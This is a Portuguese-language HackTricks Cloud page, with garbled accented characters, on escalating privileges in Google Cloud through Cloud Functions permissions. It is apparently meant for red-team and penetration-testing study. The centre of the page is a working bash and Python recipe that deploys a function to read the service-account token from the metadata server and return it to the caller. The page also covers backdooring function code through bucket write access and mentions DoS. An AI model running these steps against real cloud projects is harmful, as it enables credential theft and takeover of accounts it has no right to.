# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## cloudfunctions

Mais informa√ß√µes sobre Cloud Functions:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Um atacante com esses privil√©gios pode **criar uma nova Cloud Function com c√≥digo arbitr√°rio (malicioso) e atribu√≠-la a uma Service Account**. Em seguida, vazar o token da Service Account a partir dos metadados para escalar privil√©gios para ela.\
Alguns privil√©gios para acionar a fun√ß√£o podem ser necess√°rios.

Scripts de explora√ß√£o para este m√©todo podem ser encontrados [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) e [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) e o arquivo .zip pr√©-constru√≠do pode ser encontrado [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Um atacante com esses privil√©gios pode **modificar o c√≥digo de uma Function e at√© mesmo modificar a service account anexada** com o objetivo de exfiltrar o token.

{% hint style="danger" %}
Para implantar fun√ß√µes em nuvem, voc√™ tamb√©m precisar√° de permiss√µes actAs sobre a service account padr√£o de computa√ß√£o ou sobre a service account que √© usada para construir a imagem.
{% endhint %}

Alguns privil√©gios extras, como a permiss√£o `.call` para a vers√£o 1 de cloudfunctions ou o papel `role/run.invoker` para acionar a fun√ß√£o, podem ser necess√°rios.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
{% hint style="danger" %}
Se voc√™ receber o erro `Permission 'run.services.setIamPolicy' denied on resource...` √© porque voc√™ est√° usando o par√¢metro `--allow-unauthenticated` e n√£o tem permiss√µes suficientes para isso.
{% endhint %}

O script de explora√ß√£o para este m√©todo pode ser encontrado [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Com esta permiss√£o, voc√™ pode obter uma **URL assinada para poder fazer o upload de um arquivo para um bucket de fun√ß√£o (mas o c√≥digo da fun√ß√£o n√£o ser√° alterado, voc√™ ainda precisa atualiz√°-lo)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

N√£o tenho certeza de qu√£o √∫til apenas esta permiss√£o √© do ponto de vista de um atacante, mas √© bom saber.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

D√™ a si mesmo qualquer um dos privil√©gios anteriores **`.update`** ou **`.create`** para escalar.

### `cloudfunctions.functions.update`

Ter apenas permiss√µes de **`cloudfunctions`**, sem **`iam.serviceAccounts.actAs`**, voc√™ **n√£o poder√° atualizar a fun√ß√£o, ENT√ÉO ISTO N√ÉO √â UM V√ÅLIDO PRIVESC.**

### Acesso de Leitura e Escrita sobre o bucket

Se voc√™ tiver acesso de leitura e escrita sobre o bucket, pode monitorar mudan√ßas no c√≥digo e sempre que uma **atualiza√ß√£o no bucket acontecer, voc√™ pode atualizar o novo c√≥digo com seu pr√≥prio c√≥digo** para que a nova vers√£o da Cloud Function seja executada com o c√≥digo backdoored enviado.

Voc√™ pode verificar mais sobre o ataque em:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

No entanto, voc√™ n√£o pode usar isso para pr√©-comprometer Cloud Functions de terceiros, porque se voc√™ criar o bucket em sua conta e der permiss√µes p√∫blicas para que o projeto externo possa escrever sobre ele, voc√™ recebe o seguinte erro:

<figure><img src="../../../.gitbook/assets/image (1).png" alt="" width="304"><figcaption></figcaption></figure>

{% hint style="danger" %}
No entanto, isso pode ser usado para ataques DoS.
{% endhint %}

### Acesso de Leitura e Escrita sobre o Artifact Registry

Quando uma Cloud Function √© criada, uma nova imagem docker √© enviada para o Artifact Registry do projeto. Tentei modificar a imagem com uma nova e at√© mesmo excluir a imagem atual (e a imagem `cache`), e nada mudou, a cloud function continuou funcionando. Portanto, talvez **possa ser poss√≠vel abusar de um ataque de Condi√ß√£o de Corrida** como com o bucket para mudar o cont√™iner docker que ser√° executado, mas **apenas modificar a imagem armazenada n√£o √© poss√≠vel para comprometer a Cloud Function**.

## Refer√™ncias

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
